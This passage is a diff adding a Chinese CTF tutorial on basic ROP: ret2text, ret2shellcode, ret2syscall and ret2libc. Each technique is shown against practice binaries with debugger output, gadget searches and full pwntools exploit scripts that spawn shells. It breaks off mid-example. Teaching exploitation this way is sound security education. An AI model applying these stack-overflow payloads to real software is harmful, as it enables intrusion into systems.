@@ -1,0 +1,813 @@
+# 基本 ROP
+
+随着 NX (Non-eXecutable) 保护的开启，传统的直接向栈或者堆上直接注入代码的方式难以继续发挥效果，由此攻击者们也提出来相应的方法来绕过保护。
+
+目前被广泛使用的攻击手法是 **返回导向编程** (Return Oriented Programming)，其主要思想是在 **栈缓冲区溢出的基础上，利用程序中已有的小片段( gadgets )来改变某些寄存器或者变量的值，从而控制程序的执行流程。** 
+
+gadgets 通常是以 `ret` 结尾的指令序列，通过这样的指令序列，我们可以多次劫持程序控制流，从而运行特定的指令序列，以完成攻击的目的。
+
+返回导向编程这一名称的由来是因为其核心在于利用了指令集中的 ret 指令，从而改变了指令流的执行顺序，并通过数条 gadget “执行” 了一个新的程序。
+
+使用 ROP 攻击一般得满足如下条件：
+
+- 程序漏洞允许我们劫持控制流，并控制后续的返回地址。
+
+- 可以找到满足条件的 gadgets 以及相应 gadgets 的地址。
+
+作为一项基本的攻击手段，ROP 攻击并不局限于栈溢出漏洞，也被广泛应用在堆溢出等各类漏洞的利用当中。
+
+需要注意的是，现代操作系统通常会开启地址随机化保护（ASLR），这意味着 gadgets 在内存中的位置往往是不固定的。但幸运的是其相对于对应段基址的偏移通常是固定的，因此我们在寻找到了合适的 gadgets 之后可以通过其他方式泄漏程序运行环境信息，从而计算出 gadgets 在内存中的真正地址。
+
+## ret2text
+
+### 原理
+
+ret2text 即控制程序执行程序本身已有的的代码 (即， `.text` 段中的代码) 。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码(也就是 gadgets)，这就是我们所要说的ROP。
+
+这时，我们需要知道对应返回的代码的位置。当然程序也可能会开启某些保护，我们需要想办法去绕过这些保护。
+
+### 例子
+
+其实，在栈溢出的基本原理中，我们已经介绍了这一简单的攻击。在这里，我们再给出另外一个例子，bamboofox 中介绍 ROP 时使用的 ret2text 的例子。
+
+> 点击下载: [ret2text](https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/linux/user-mode/stackoverflow/ret2text/bamboofox-ret2text/ret2text)
+
+首先，查看一下程序的保护机制：
+
+```shell
+➜  ret2text checksec ret2text
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+```
+
+可以看出程序是 32 位程序，且仅开启了栈不可执行保护。接下来我们使用 IDA 反编译该程序：
+
+```C
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  int v4; // [sp+1Ch] [bp-64h]@1
+
+  setvbuf(stdout, 0, 2, 0);
+  setvbuf(_bss_start, 0, 1, 0);
+  puts("There is something amazing here, do you know anything?");
+  gets((char *)&v4);
+  printf("Maybe I will tell you next time !");
+  return 0;
+}
+```
+
+可以看出程序在主函数中使用了 gets 函数，显然存在栈溢出漏洞。接下来查看反汇编代码：
+
+```asm
+.text:080485FD secure          proc near
+.text:080485FD
+.text:080485FD input           = dword ptr -10h
+.text:080485FD secretcode      = dword ptr -0Ch
+.text:080485FD
+.text:080485FD                 push    ebp
+.text:080485FE                 mov     ebp, esp
+.text:08048600                 sub     esp, 28h
+.text:08048603                 mov     dword ptr [esp], 0 ; timer
+.text:0804860A                 call    _time
+.text:0804860F                 mov     [esp], eax      ; seed
+.text:08048612                 call    _srand
+.text:08048617                 call    _rand
+.text:0804861C                 mov     [ebp+secretcode], eax
+.text:0804861F                 lea     eax, [ebp+input]
+.text:08048622                 mov     [esp+4], eax
+.text:08048626                 mov     dword ptr [esp], offset unk_8048760
+.text:0804862D                 call    ___isoc99_scanf
+.text:08048632                 mov     eax, [ebp+input]
+.text:08048635                 cmp     eax, [ebp+secretcode]
+.text:08048638                 jnz     short locret_8048646
+.text:0804863A                 mov     dword ptr [esp], offset command ; "/bin/sh"
+.text:08048641                 call    _system
+```
+
+在 secure 函数又发现了存在调用 `system("/bin/sh")` 的代码，那么如果我们直接控制程序返回至 `0x0804863A` ，那么就可以得到系统的 shell 了。
+
+下面就是我们如何构造 payload 了，首先需要确定的是我们能够控制的内存的起始地址距离 main 函数的返回地址的字节数。
+
+```asm
+.text:080486A7                 lea     eax, [esp+1Ch]
+.text:080486AB                 mov     [esp], eax      ; s
+.text:080486AE                 call    _gets
+```
+
+可以看到该字符串是通过相对于 esp 的索引，所以我们需要进行调试，将断点下在 call 处，查看 esp，ebp，如下：
+
+```shell
+gef➤  b *0x080486AE
+Breakpoint 1 at 0x80486ae: file ret2text.c, line 24.
+gef➤  r
+There is something amazing here, do you know anything?
+
+Breakpoint 1, 0x080486ae in main () at ret2text.c:24
+24	    gets(buf);
+───────────────────────────────────────────────────────────────────────[ registers ]────
+$eax   : 0xffffcd5c  →  0x08048329  →  "__libc_start_main"
+$ebx   : 0x00000000
+$ecx   : 0xffffffff
+$edx   : 0xf7faf870  →  0x00000000
+$esp   : 0xffffcd40  →  0xffffcd5c  →  0x08048329  →  "__libc_start_main"
+$ebp   : 0xffffcdc8  →  0x00000000
+$esi   : 0xf7fae000  →  0x001b1db0
+$edi   : 0xf7fae000  →  0x001b1db0
+$eip   : 0x080486ae  →  <main+102> call 0x8048460 <gets@plt>
+```
+
+
+可以看到 esp 为 0xffffcd40，ebp 为 0xffffcdc8，同时 s 相对于 esp 的索引为 `esp+0x1c`，因此，我们可以推断：
+
+- s 的地址为 0xffffcd5c
+- s 相对于 ebp 的偏移为 0x6c
+- s 相对于返回地址的偏移为 0x6c+4
+
+因此最后的 payload 如下：
+
+```python
+##!/usr/bin/env python
+from pwn import *
+
+sh = process('./ret2text')
+target = 0x804863a
+sh.sendline(b'A' * (0x6c + 4) + p32(target))
+sh.interactive()
+```
+
+## ret2shellcode
+
+### 原理
+
+ret2shellcode，即控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。**通常情况下，shellcode 需要我们自行编写，即此时我们需要自行向内存中填充一些可执行的代码**。
+
+在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限。
+
+需要注意的是，**在新版内核当中引入了较为激进的保护策略，程序中通常不再默认有同时具有可写与可执行的段，这使得传统的 ret2shellcode 手法不再能直接完成利用**。
+
+### 例子
+
+这里我们以 bamboofox 中的 ret2shellcode 为例，需要注意的是，你应当在内核版本较老的环境中进行实验（如 Ubuntu 18.04 或更老版本）。由于容器环境间共享同一内核，因此这里我们无法通过 docker 完成环境搭建。
+
+> 点击下载: [ret2shellcode](https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/linux/user-mode/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode)
+
+首先检测程序开启的保护：
+
+```shell
+➜  ret2shellcode checksec ret2shellcode
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x8048000)
+    RWX:      Has RWX segments
+```
+
+可以看出源程序几乎没有开启任何保护，并且有可读，可写，可执行段。接下来我们再使用 IDA 对程序进行反编译：
+
+```C
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  int v4; // [sp+1Ch] [bp-64h]@1
+
+  setvbuf(stdout, 0, 2, 0);
+  setvbuf(stdin, 0, 1, 0);
+  puts("No system for you this time !!!");
+  gets((char *)&v4);
+  strncpy(buf2, (const char *)&v4, 0x64u);
+  printf("bye bye ~");
+  return 0;
+}
+```
+
+可以看出，程序仍然是基本的栈溢出漏洞，不过这次还同时将对应的字符串复制到 buf2 处。简单查看可知 buf2 在 bss 段。
+
+```asm
+.bss:0804A080                 public buf2
+.bss:0804A080 ; char buf2[100]
+```
+
+这时，我们简单的调试下程序，看看这一个 bss 段是否可执行。
+
+```shell
+gef➤  b main
+Breakpoint 1 at 0x8048536: file ret2shellcode.c, line 8.
+gef➤  r
+Starting program: /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode 
+
+Breakpoint 1, main () at ret2shellcode.c:8
+8	    setvbuf(stdout, 0LL, 2, 0LL);
+─────────────────────────────────────────────────────────────────────[ source:ret2shellcode.c+8 ]────
+      6	 int main(void)
+      7	 {
+ →    8	     setvbuf(stdout, 0LL, 2, 0LL);
+      9	     setvbuf(stdin, 0LL, 1, 0LL);
+     10	 
+─────────────────────────────────────────────────────────────────────[ trace ]────
+[#0] 0x8048536 → Name: main()
+─────────────────────────────────────────────────────────────────────────────────────────────────────
+gef➤  vmmap 
+Start      End        Offset     Perm Path
+0x08048000 0x08049000 0x00000000 r-x /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode
+0x08049000 0x0804a000 0x00000000 r-x /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode
+0x0804a000 0x0804b000 0x00001000 rwx /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode
+0xf7dfc000 0xf7fab000 0x00000000 r-x /lib/i386-linux-gnu/libc-2.23.so
+0xf7fab000 0xf7fac000 0x001af000 --- /lib/i386-linux-gnu/libc-2.23.so
+0xf7fac000 0xf7fae000 0x001af000 r-x /lib/i386-linux-gnu/libc-2.23.so
+0xf7fae000 0xf7faf000 0x001b1000 rwx /lib/i386-linux-gnu/libc-2.23.so
+0xf7faf000 0xf7fb2000 0x00000000 rwx 
+0xf7fd3000 0xf7fd5000 0x00000000 rwx 
+0xf7fd5000 0xf7fd7000 0x00000000 r-- [vvar]
+0xf7fd7000 0xf7fd9000 0x00000000 r-x [vdso]
+0xf7fd9000 0xf7ffb000 0x00000000 r-x /lib/i386-linux-gnu/ld-2.23.so
+0xf7ffb000 0xf7ffc000 0x00000000 rwx 
+0xf7ffc000 0xf7ffd000 0x00022000 r-x /lib/i386-linux-gnu/ld-2.23.so
+0xf7ffd000 0xf7ffe000 0x00023000 rwx /lib/i386-linux-gnu/ld-2.23.so
+0xfffdd000 0xffffe000 0x00000000 rwx [stack]
+```
+
+通过 vmmap，我们可以看到 bss 段对应的段具有可执行权限：
+
+```text
+0x0804a000 0x0804b000 0x00001000 rwx /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode
+```
+
+那么这次我们就控制程序执行 shellcode，也就是读入 shellcode，然后控制程序执行 bss 段处的 shellcode。其中，相应的偏移计算类似于 ret2text 中的例子。
+
+最后的 payload 如下：
+
+```python
+#!/usr/bin/env python
+from pwn import *
+
+sh = process('./ret2shellcode')
+shellcode = asm(shellcraft.sh())
+buf2_addr = 0x804a080
+
+sh.sendline(shellcode.ljust(112, b'A') + p32(buf2_addr))
+sh.interactive()
+```
+
+### 另一个例子
+
+这里我们以通过`mprotect()`动态修改过内存页权限的 ret2shellcode 为例，需要注意的是，这样我们就可以在例如 Ubuntu-22.04 这样的现代操作系统中完成这个实验辣~。
+
+> 点击下载: [ret2shellcode](https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/linux/user-mode/stackoverflow/ret2shellcode/ret2shellcode-new/ret2shellcode)
+
+首先检测程序开启的保护：
+
+```shell
+# zer0ptr @ DESKTOP-FHEMUHT in ~/Pwn-Research/ROP/ret2shellcode/wiki [21:14:26]
+$ checksec ret2shellcode
+[*] '/home/zer0ptr/Pwn-Research/ROP/ret2shellcode/wiki/ret2shellcode'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX unknown - GNU_STACK missing
+    PIE:        No PIE (0x400000)
+    Stack:      Executable
+    RWX:        Has RWX segments
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
+```
+
+可以看出源程序几乎没有开启任何保护，并且有可读，可写，可执行段。接下来我们再使用 IDA 对程序进行反编译：
+
+```C
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  int v3; // eax
+  char src[104]; // [rsp+0h] [rbp-70h] BYREF
+  void *addr; // [rsp+68h] [rbp-8h]
+
+  setvbuf(stdout, 0, 2, 0);
+  setvbuf(stdin, 0, 1, 0);
+  addr = (void *)((unsigned __int64)buf2 & -getpagesize());
+  v3 = getpagesize();
+  if ( mprotect(addr, v3, 7) >= 0 )
+  {
+    puts("No system for you this time !!!");
+    printf("buf2 address: %p\n", buf2);
+    gets(src);
+    strncpy(buf2, src, 0x64u);
+    printf("bye bye ~");
+    return 0;
+  }
+  else
+  {
+    perror("mprotect failed");
+    return 1;
+  }
+}
+```
+
+可以看出，程序仍然是基本的栈溢出漏洞，不过这次还同时将对应的字符串复制到 buf2 处。简单查看可知 buf2 在 bss 段。
+
+```asm
+.bss:00000000004040A0 buf2            db 68h dup(?)           ; DATA XREF: main+51↑o
+.bss:00000000004040A0                                         ; main+A4↑o ...
+```
+
+这时，我们简单的调试下程序，看看这一个 bss 段是否可执行(由于是通过mprotect来修改权限的，那自然断点下在mprotect被调用后的地址啦)。
+
+```shell
+pwndbg> b *0x401291
+Breakpoint 1 at 0x401291
+pwndbg> r
+Starting program: /home/zer0ptr/Pwn-Research/ROP/ret2shellcode/wiki/ret2shellcode
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+
+Breakpoint 1, 0x0000000000401291 in main ()
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────
+ RAX  0
+ RBX  0
+ RCX  0x7ffff7d1eb1b (mprotect+11) ◂— cmp rax, -0xfff
+ RDX  7
+ RDI  0x404000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x403e20 (_DYNAMIC) ◂— 1
+ RSI  0x1000
+ R8   0x7ffff7e1bf10 (initial+16) ◂— 4
+ R9   0x7ffff7fc9040 (_dl_fini) ◂— endbr64
+ R10  0x7ffff7c082e0 ◂— 0xf0022000056ec
+ R11  0x202
+ R12  0x7fffffffde58 —▸ 0x7fffffffe0fd ◂— '/home/zer0ptr/Pwn-Research/ROP/ret2shellcode/wiki/ret2shellcode'
+ R13  0x401216 (main) ◂— endbr64
+ R14  0x403e18 (__do_global_dtors_aux_fini_array_entry) —▸ 0x4011e0 (__do_global_dtors_aux) ◂— endbr64
+ R15  0x7ffff7ffd040 (_rtld_global) —▸ 0x7ffff7ffe2e0 ◂— 0
+ RBP  0x7fffffffdd40 ◂— 1
+ RSP  0x7fffffffdcd0 ◂— 1
+ RIP  0x401291 (main+123) ◂— test eax, eax
+─────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────────
+ ► 0x401291 <main+123>    test   eax, eax     0 & 0     EFLAGS => 0x246 [ cf PF af ZF sf IF df of ac ]
+   0x401293 <main+125>  ✔ jns    main+149                    <main+149>
+    ↓
+   0x4012ab <main+149>    lea    rax, [rip + 0xd66]     RAX => 0x402018 ◂— 'No system for you this time !!!'
+   0x4012b2 <main+156>    mov    rdi, rax               RDI => 0x402018 ◂— 'No system for you this time !!!'
+   0x4012b5 <main+159>    call   puts@plt                    <puts@plt>
+
+   0x4012ba <main+164>    lea    rax, [rip + 0x2ddf]     RAX => 0x4040a0 (buf2)
+   0x4012c1 <main+171>    mov    rsi, rax                RSI => 0x4040a0 (buf2)
+   0x4012c4 <main+174>    lea    rax, [rip + 0xd6d]      RAX => 0x402038 ◂— 'buf2 address: %p\n'
+   0x4012cb <main+181>    mov    rdi, rax                RDI => 0x402038 ◂— 'buf2 address: %p\n'
+   0x4012ce <main+184>    mov    eax, 0                  EAX => 0
+   0x4012d3 <main+189>    call   printf@plt                  <printf@plt>
+──────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────
+00:0000│ rsp 0x7fffffffdcd0 ◂— 1
+01:0008│-068 0x7fffffffdcd8 ◂— 1
+02:0010│-060 0x7fffffffdce0 —▸ 0x400040 ◂— 0x400000006
+03:0018│-058 0x7fffffffdce8 —▸ 0x7ffff7fe283c (_dl_sysdep_start+1020) ◂— mov rax, qword ptr [rsp + 0x58]
+04:0020│-050 0x7fffffffdcf0 ◂— 0x6f0
+05:0028│-048 0x7fffffffdcf8 —▸ 0x7fffffffe0d9 ◂— 0xb0ec6c6b3dbd55d3
+06:0030│-040 0x7fffffffdd00 —▸ 0x7ffff7fc1000 ◂— jg 0x7ffff7fc1047
+07:0038│-038 0x7fffffffdd08 ◂— 0x10101000000
+────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────
+ ► 0         0x401291 main+123
+   1   0x7ffff7c29d90 __libc_start_call_main+128
+   2   0x7ffff7c29e40 __libc_start_main+128
+   3         0x401155 _start+37
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────
+pwndbg> vmmap
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+             Start                End Perm     Size  Offset File (set vmmap-prefer-relpaths on)
+          0x400000           0x401000 r--p     1000       0 ret2shellcode
+          0x401000           0x402000 r-xp     1000    1000 ret2shellcode
+          0x402000           0x403000 r--p     1000    2000 ret2shellcode
+          0x403000           0x404000 r--p     1000    2000 ret2shellcode
+          0x404000           0x405000 rwxp     1000    3000 ret2shellcode
+    0x7ffff7c00000     0x7ffff7c28000 r--p    28000       0 /usr/lib/x86_64-linux-gnu/libc.so.6
+    0x7ffff7c28000     0x7ffff7dbd000 r-xp   195000   28000 /usr/lib/x86_64-linux-gnu/libc.so.6
+    0x7ffff7dbd000     0x7ffff7e15000 r--p    58000  1bd000 /usr/lib/x86_64-linux-gnu/libc.so.6
+    0x7ffff7e15000     0x7ffff7e16000 ---p     1000  215000 /usr/lib/x86_64-linux-gnu/libc.so.6
+    0x7ffff7e16000     0x7ffff7e1a000 r--p     4000  215000 /usr/lib/x86_64-linux-gnu/libc.so.6
+    0x7ffff7e1a000     0x7ffff7e1c000 rw-p     2000  219000 /usr/lib/x86_64-linux-gnu/libc.so.6
+    0x7ffff7e1c000     0x7ffff7e29000 rw-p     d000       0 [anon_7ffff7e1c]
+    0x7ffff7fad000     0x7ffff7fb0000 rw-p     3000       0 [anon_7ffff7fad]
+    0x7ffff7fbb000     0x7ffff7fbd000 rw-p     2000       0 [anon_7ffff7fbb]
+    0x7ffff7fbd000     0x7ffff7fc1000 r--p     4000       0 [vvar]
+    0x7ffff7fc1000     0x7ffff7fc3000 r-xp     2000       0 [vdso]
+    0x7ffff7fc3000     0x7ffff7fc5000 r--p     2000       0 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+    0x7ffff7fc5000     0x7ffff7fef000 r-xp    2a000    2000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+    0x7ffff7fef000     0x7ffff7ffa000 r--p     b000   2c000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+    0x7ffff7ffb000     0x7ffff7ffd000 r--p     2000   37000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+    0x7ffff7ffd000     0x7ffff7fff000 rw-p     2000   39000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+    0x7ffffffde000     0x7ffffffff000 rwxp    21000       0 [stack]
+```
+
+这里也是一样通过 vmmap，我们可以看到 bss 段对应的段具有可执行权限：
+
+```text
+0x404000           0x405000 rwxp     1000    3000 ret2shellcode
+```
+
+思路和上一个例子是相同的
+
+最后的 payload 如下：
+
+```python
+#!/usr/bin/env python3
+from pwn import *
+context.binary = './ret2shellcode'
+context.log_level = 'debug'
+io = process('./ret2shellcode')
+
+buf2_addr = 0x4040a0
+shellcode = asm(shellcraft.sh())
+
+payload = shellcode.ljust(100, b'\x90')  
+payload = payload.ljust(120, b'a')       
+payload += p64(buf2_addr)                
+
+io.sendline(payload)
+io.interactive()
+```
+
+### 题目
+
+- sniperoj-pwn100-shellcode-x86-64
+
+## ret2syscall
+
+### 原理
+
+ret2syscall，即控制程序执行系统调用，获取 shell。
+
+### 例子
+
+这里我们继续以 bamboofox 中的 ret2syscall 为例。  
+
+> 点击下载: [ret2syscall](https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/linux/user-mode/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop)
+
+首先检测程序开启的保护：
+
+```shell
+➜  ret2syscall checksec rop
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+```
+
+可以看出，源程序为 32 位，开启了 NX 保护。接下来利用 IDA 进行反编译：
+
+```C
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  int v4; // [sp+1Ch] [bp-64h]@1
+
+  setvbuf(stdout, 0, 2, 0);
+  setvbuf(stdin, 0, 1, 0);
+  puts("This time, no system() and NO SHELLCODE!!!");
+  puts("What do you plan to do?");
+  gets(&v4);
+  return 0;
+}
+```
+
+可以看出此次仍然是一个栈溢出。类似于之前的做法，我们可以获得 v4 相对于 ebp 的偏移为 108。所以我们需要覆盖的返回地址相对于 v4 的偏移为 112。此次，由于我们不能直接利用程序中的某一段代码或者自己填写代码来获得 shell，所以我们利用程序中的 gadgets 来获得 shell，而对应的 shell 获取则是利用系统调用。关于系统调用的知识，请参考：
+
+- https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8
+
+简单地说，只要我们把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们在执行 int 0x80 就可执行对应的系统调用。比如说这里我们利用如下系统调用来获取 shell：
+
+```C
+execve("/bin/sh",NULL,NULL)
+```
+
+其中，该程序是 32 位，所以我们需要使得
+
+- 系统调用号，即 eax 应该为 0xb
+- 第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。
+- 第二个参数，即 ecx 应该为 0
+- 第三个参数，即 edx 应该为 0
+
+而我们如何控制这些寄存器的值 呢？这里就需要使用 gadgets。比如说，现在栈顶是 10，那么如果此时执行了pop eax，那么现在 eax 的值就为 10。但是我们并不能期待有一段连续的代码可以同时控制对应的寄存器，所以我们需要一段一段控制，这也是我们在 gadgets 最后使用 ret 来再次控制程序执行流程的原因。具体寻找 gadgets的方法，我们可以使用 ropgadgets 这个工具。
+
+首先，我们来寻找控制 eax 的gadgets
+
+```shell
+➜  ret2syscall ROPgadget --binary rop  --only 'pop|ret' | grep 'eax'
+0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret
+0x080bb196 : pop eax ; ret
+0x0807217a : pop eax ; ret 0x80e
+0x0804f704 : pop eax ; ret 3
+0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret
+```
+
+可以看到有上述几个都可以控制 eax，我选取第二个来作为 gadgets。
+
+类似的，我们可以得到控制其它寄存器的 gadgets
+
+```shell
+➜  ret2syscall ROPgadget --binary rop  --only 'pop|ret' | grep 'ebx'
+0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret
+0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret
+0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret
+0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret
+0x080be23f : pop ebx ; pop edi ; ret
+0x0806eb69 : pop ebx ; pop edx ; ret
+0x08092258 : pop ebx ; pop esi ; pop ebp ; ret
+0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
+0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10
+0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14
+0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc
+0x0805ae81 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4
+0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8
+0x08048913 : pop ebx ; pop esi ; pop edi ; ret
+0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4
+0x08049a94 : pop ebx ; pop esi ; ret
+0x080481c9 : pop ebx ; ret
+0x080d7d3c : pop ebx ; ret 0x6f9
+0x08099c87 : pop ebx ; ret 8
+0x0806eb91 : pop ecx ; pop ebx ; ret
+0x0806336b : pop edi ; pop esi ; pop ebx ; ret
+0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret
+0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret
+0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret
+0x0805c820 : pop esi ; pop ebx ; ret
+0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
+0x0807b6ed : pop ss ; pop ebx ; ret
+```
+
+这里，我选择
+
+```text
+0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret
+```
+
+这个可以直接控制其它三个寄存器。
+
+此外，我们需要获得 /bin/sh 字符串对应的地址。
+
+```shell
+➜  ret2syscall ROPgadget --binary rop  --string '/bin/sh' 
+Strings information
+============================================================
+0x080be408 : /bin/sh
+```
+
+可以找到对应的地址，此外，还有 int 0x80 的地址，如下
+
+```text
+➜  ret2syscall ROPgadget --binary rop  --only 'int'                 
+Gadgets information
+============================================================
+0x08049421 : int 0x80
+0x080938fe : int 0xbb
+0x080869b5 : int 0xf6
+0x0807b4d4 : int 0xfc
+
+Unique gadgets found: 4
+```
+
+同时，也找到对应的地址了。
+
+下面就是对应的 payload，其中 0xb 为 execve 对应的系统调用号。
+
+```python
+#!/usr/bin/env python
+from pwn import *
+
+sh = process('./rop')
+
+pop_eax_ret = 0x080bb196
+pop_edx_ecx_ebx_ret = 0x0806eb90
+int_0x80 = 0x08049421
+binsh = 0x80be408
+payload = flat(
+    ['A' * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])
+sh.sendline(payload)
+sh.interactive()
+```
+
+### 题目
+
+## ret2libc
+
+### 原理
+
+ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置(即函数对应的 got表项的内容)。一般情况下，我们会选择执行 system("/bin/sh")，故而此时我们需要知道 system 函数的地址。
+
+### 例子
+
+我们由简单到难分别给出三个例子。
+
+#### 例1
+
+这里我们以 bamboofox 中 ret2libc1 为例。 
+
+> 点击下载: [ret2libc1](https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/linux/user-mode/stackoverflow/ret2libc/ret2libc1/ret2libc1)
+
+首先，我们检查一下程序的安全保护：
+
+```shell
+➜  ret2libc1 checksec ret2libc1    
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+```
+
+源程序为 32 位，开启了 NX 保护。下面对程序进行反编译以确定漏洞位置：
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  int v4; // [sp+1Ch] [bp-64h]@1
+
+  setvbuf(stdout, 0, 2, 0);
+  setvbuf(_bss_start, 0, 1, 0);
+  puts("RET2LIBC >_<");
+  gets((char *)&v4);
+  return 0;
+}
+```
+
+可以看到在执行 gets 函数的时候出现了栈溢出。此外，利用 ropgadget，我们可以查看是否有 /bin/sh 存在：
+
+```shell
+➜  ret2libc1 ROPgadget --binary ret2libc1 --string '/bin/sh'          
+Strings information
+============================================================
+0x08048720 : /bin/sh
+```
+
+确实存在，再次查找一下是否有 system 函数存在。经在 ida 中查找，确实也存在。
+
+```asm
+.plt:08048460 ; [00000006 BYTES: COLLAPSED FUNCTION _system. PRESS CTRL-NUMPAD+ TO EXPAND]
+```
+
+那么，我们直接返回该处，即执行 system 函数。相应的 payload 如下：
+
+```python
+#!/usr/bin/env python3
+from pwn import *
+
+sh = process('./ret2libc1')
+
+binsh_addr = 0x8048720
+system_plt = 0x08048460
+payload = flat([b'a' * 112, system_plt, b'b' * 4, binsh_addr])
+sh.sendline(payload)
+
+sh.interactive()
+```
+
+这里我们需要注意函数调用栈的结构，如果是正常调用 system 函数，我们调用的时候会有一个对应的返回地址，这里以 `'bbbb'` 作为虚假的地址，其后参数对应的参数内容。
+
+这个例子相对来说简单，同时提供了 system 地址与 /bin/sh 的地址，但是大多数程序并不会有这么好的情况。
+
+#### 例2
+
+这里以 bamboofox 中的 ret2libc2 为例 。
+
+> 点击下载: [ret2libc2](https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/linux/user-mode/stackoverflow/ret2libc/ret2libc2/ret2libc2)
+
+该题目与例 1 基本一致，只不过不再出现 /bin/sh 字符串，所以此次需要我们自己来读取字符串，所以我们需要两个 gadgets，第一个控制程序读取字符串，第二个控制程序执行 system("/bin/sh")。由于漏洞与上述一致，这里就不在多说，具体的 exp 如下：
+
+```python
+#!/usr/bin/env python3
+from pwn import *
+
+sh = process('./ret2libc2')
+
+gets_plt = 0x08048460
+system_plt = 0x08048490
+pop_ebx = 0x0804843d
+buf2 = 0x804a080
+payload = flat(
+    [b'a' * 112, gets_plt, pop_ebx, buf2, system_plt, 0xdeadbeef, buf2])
+sh.sendline(payload)
+sh.sendline(b'/bin/sh')
+sh.interactive()
+```
+
+需要注意的是，我这里向程序中 bss 段的 buf2 处写入 /bin/sh 字符串，并将其地址作为 system 的参数传入。这样以便于可以获得 shell。
+
+#### 例3
+
+这里以 bamboofox 中的 ret2libc3 为例  。
+
+> 点击下载: [ret2libc3](https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/linux/user-mode/stackoverflow/ret2libc/ret2libc3/ret2libc3)
+
+在例 2 的基础上，再次将 system 函数的地址去掉。此时，我们需要同时找到 system 函数地址与 /bin/sh 字符串的地址。首先，查看安全保护
+
+```shell
+➜  ret2libc3 checksec ret2libc3
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+```
+
+可以看出，源程序仍旧开启了堆栈不可执行保护。进而查看源码，发现程序的 bug 仍然是栈溢出：
+
+```C
